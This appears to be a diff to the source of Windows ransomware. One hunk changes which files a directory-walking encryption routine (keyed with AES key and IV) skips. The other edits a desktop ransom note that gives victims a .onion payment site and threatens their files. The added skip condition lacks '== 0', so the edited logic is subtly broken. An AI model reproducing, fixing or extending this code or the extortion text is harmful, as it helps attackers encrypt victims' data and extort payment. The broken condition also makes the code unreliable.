@@ -599,7 +599,7 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 		if (wcscmp(fileData.cFileName, L".") == 0 || wcscmp(fileData.cFileName, L"..") == 0) {
 			continue;
 		}
-		if (wcscmp(fileData.cFileName, L"AES_key") == 0 || wcscmp(fileData.cFileName, L"IV") == 0 || wcscmp(fileData.cFileName, L"desktop.ini") == 0) {
+		if (wcscmp(fileData.cFileName, L"AES_key") == 0 || wcscmp(fileData.cFileName, L"IV") == 0 || wcscmp(fileData.cFileName, L"desktop.ini") == 0 || wcscmp(fileData.cFileName, L"AppData")) {
 			continue;
 		}
 		StringCchCopy(filePath, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
@@ -1310,7 +1310,7 @@ VOID WriteWarningToDesktop() {
 			"2. Open it. Take a deep breath.\n"
 			"\n"
 			"3. Go to our special website (you’ll love it):\n"
-			"aav3lis2vqulgmot2dulx7seyqv3vyv4i5r3gp5k7bi2t7ll6dsofxyd.onion\n"
+			"http://tazayldgziyi46ylvrhezoep4bskhkrq2ipkdclmuygaxwu43amiicyd.onion\n"
 			"\n"
 			"Once you're there, follow the instructions. Yes, it involves money. No, we don’t do refunds.\n"
 			"Try anything funny, and your files take a one-way trip to the digital abyss.\n"
